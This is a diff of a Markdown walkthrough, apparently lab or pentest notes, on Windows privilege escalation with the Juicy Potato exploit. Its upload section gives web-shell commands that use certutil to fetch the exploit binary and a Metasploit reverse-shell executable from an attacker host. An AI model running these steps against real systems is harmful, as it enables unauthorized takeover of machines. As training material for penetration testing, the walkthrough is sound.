@@ -30,10 +30,20 @@ Expected:
 ```
 System Type: X86-based PC
 ```
-
 ---
 
-### 2️⃣ Verify Required Privilege
+### 2. Confirm Windows Version
+
+```cmd
+wmic os get Caption,Version,OSArchitecture
+```
+
+This helps determine whether **Juicy Potato** is the correct exploit for the target OS.
+
+---
+---
+
+### 3. Verify Required Privilege
 Juicy Potato requires **SeImpersonatePrivilege** OR **SeAssignPrimaryTokenPrivilege**.
 
 ```cmd
@@ -47,7 +57,7 @@ SeImpersonatePrivilege   Enabled
 
 ---
 
-### 3️⃣ Verify Juicy Potato Binary Architecture
+### 3️4. Verify Juicy Potato Binary Architecture
 Check on attacker (Kali/Base) machine:
 ```bash
 file Juicy.Potato.x86.exe
@@ -72,15 +82,16 @@ Host the payload on attacker machine:
 ```bash
 python3 -m http.server 80
 ```
-
 ---
+## Upload Files to Target
 
-## Upload Payload to Target (Windows)
+Upload both binaries to the target (example using `certutil`):
 
 ```text
-cmd_shell.php?cmd=certutil.exe -urlcache -f http://192.168.45.189/msf_32_rev_shell.exe msf_32_rev_shell.exe
+cmd_shell.php?cmd=certutil.exe -urlcache -f http://ATTACKER_IP/Juicy.Potato.x86.exe Juicy.Potato.x86.exe
+cmd_shell.php?cmd=certutil.exe -urlcache -f http://ATTACKER_IP/msf_32_rev_shell.exe msf_32_rev_shell.exe
 ```
-
+---
 ---
 
 ## Juicy Potato Exploitation
